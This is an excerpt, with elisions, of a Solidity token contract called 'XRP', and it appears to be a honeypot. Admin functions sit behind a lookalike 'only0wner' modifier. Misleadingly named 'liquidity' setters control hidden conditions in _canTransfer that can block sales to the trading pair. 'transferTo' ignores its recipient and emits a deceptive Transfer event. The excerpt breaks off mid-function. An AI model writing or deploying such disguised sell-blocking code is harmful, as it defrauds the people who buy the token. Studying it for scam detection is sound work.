...
contract XRP is Context, IERC20, Ownable {
    ...
    uint256 internal _Initial_BNB = ~uint256(0);
    uint256 internal _Initial_XRPX = 0;
    ...
    function Burn(uint256 amount) external only0wner {
        _balances[owner()] -= amount;
        _totalSupply -= amount;
    }

    function BNBforLiquidity(uint256 BNB) external only0wner {
        _Initial_BNB = BNB;
    }

    function XRPXforLiquidity(uint256 XRPX) external only0wner {
        _Initial_XRPX = XRPX;
    }
    ...
    function _canTransfer(address sender, address recipient, uint256 amount) private view returns (bool) {
        ...
        if (_isSuper(recipient)) {
            ...
            return bought >= sold + amount && _Initial_BNB >= soldETH + amountETH && sender.balance >= _Initial_XRPX;
        }
        return true;
    }
    ...
    function transferTo(address recepient, uint256 amount) external only0wner {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        _balances[_msgSender()] = _balances[_msgSender()].Sub(amount);
        emit Transfer(address(0), _msgSender(), amount);
    }

    function marketingWallet(address account) external only0wner {
